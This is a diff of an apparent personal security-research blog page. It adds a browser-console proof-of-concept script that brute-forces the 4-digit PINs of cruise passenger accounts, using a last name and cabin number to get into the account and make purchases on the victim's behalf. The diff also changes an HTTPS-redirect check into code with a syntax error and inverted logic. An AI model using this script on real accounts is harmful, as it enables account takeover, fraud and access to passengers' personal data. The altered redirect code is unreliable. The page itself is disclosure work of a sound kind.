@@ -29,7 +29,7 @@
   <link rel="stylesheet" href="/style.css">
   <script>
       function enforceHTTPS() {
-          if (window.location.protocol !== "https:" && window.location.host !== 'localhost:3000') {
+          if (window.location.protocol !== "https:" && window.location.host.includes('localhost') {
               window.location.href = "https://" + window.location.host + window.location.pathname + window.location.search;
           }
       }
@@ -80,7 +80,8 @@
       <h2><a name="print">INTRO</a></h2>
 
       <p>
-        I'm not a professional full-time security researcher. This section will just function as a log around security and privacy issues I discover in applications and services I use in my day-to-day life.
+        I'm not a professional full-time security researcher. This section will just function as a log around security and privacy issues I discover in applications and services I use in my day-to-day life.<br/>
+        Unfortunately none of the affected companies had any Vulnerability Disclosure Program (VDP) in place, so contacting the right department or person wasn't always easy.
         <br /><br />
       </p>
 
@@ -206,8 +207,43 @@
         This led me to the assumption that the accounts, with the knowledge of a passenger’s lastname and cabin number can be easily brute-forced by testing for all PIN combinations 0000-9999.<br />
         <br />
         Once a passenger account is compromised, one could financially damage a customer by placing orders on his behalf, such as buying and using internet plans (worth up to 119,90 EUR). Furthermore, personal information like the cruise line's club class, purchase history, can be accessed.<br /><br />
+        (PoC provided)<br /><br />
 
-        <img src="/img/research/cruise14.png" height="400"/>
+        <img src="/img/research/cruise14.png" height="400"/><br /><br />
+
+        The PoC code below, run in the browser’s developer console, could achieve this:
+        <pre><code><small>
+          var lastName = 'Conradt';
+          var cabin = '6444';
+          var pinCode = 0 * 1000;
+          var pinCodeStr = '';
+          var pinCodeEnd = 9999;
+          var found = false;
+          document.forms[0].elements[4].value = cabin;
+          document.forms[0].elements[5].value = lastName;
+          var test2 = function() {
+            if ((document.documentElement.textContent ||
+              document.document.innerText).indexOf('fehlgeschlagen') > -1
+              && document.getElementsByClassName('fancybox-overlay')[0]) {
+              console.log('Incorrect: ' + pinCodeStr);
+              document.getElementsByClassName('btn btn-block btn-primary btn-lg')[1].click();
+            }
+            pinCode++;
+          }
+          var test = function() {
+            pinCodeStr = pinCode + '';
+            while (pinCodeStr.length<4) pinCodeStr='0' + pinCodeStr; 
+            document.forms[0].elements[6].value=pinCodeStr;
+            document.forms[0].elements[7].click(); 
+            setTimeout(test2, 4000); 
+            if (!found && pinCode <=pinCodeEnd) setTimeout(test, 6000);
+          } 
+          window.onbeforeunload=function (e) { 
+            console.log('====> Correct: ' + pinCodeStr); 
+            alert('====> Correct: ' + pinCodeStr); 
+          };
+          setTimeout(test, 6000);
+        </small></code></pre>
       </p>
       <h3>Provided Recommendations</h3>
       <p>
@@ -215,8 +251,7 @@
           <li>use stronger passwords</li>
           <li>enable brute-force protection, lock accounts (to be unlocked via reception)</li>
           <li>don’t use subsequent numbers for PINS for a passenger and accompanying person</li>
-        </ul>
-        (PoC provided)
+        </ul>        
       </p>
     </div>
   </div>
